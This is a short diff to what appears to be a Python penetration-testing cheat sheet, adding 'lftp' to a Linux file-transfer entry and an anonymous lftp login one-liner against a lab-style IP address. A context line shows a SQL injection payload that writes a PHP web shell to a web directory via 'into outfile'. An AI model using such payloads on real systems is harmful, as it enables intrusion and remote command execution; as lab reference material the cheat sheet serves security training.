@@ -800,7 +800,7 @@ cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/
 ######################################
 ######################################
 
-fileTransfereLinux = Cheat("File Transfere Linux - nc / ftp")
+fileTransfereLinux = Cheat("File Transfere Linux - nc / ftp / lftp")
 fileTransfereLinux.category = "Linux"
 fileTransfereLinux.output = """[*] File Transfere Techniques With nc - Linux
 
@@ -821,6 +821,10 @@ curlftpfs anonymous:senhalol@10.10.10.78 $(pwd)
 ftp > binary
 ftp > prompt off
 ftp > mget *
+
+[*] Login oneLiner with crdentials
+
+lftp -u anonymous,'' 10.10.10.184
 """
 
 ######################################
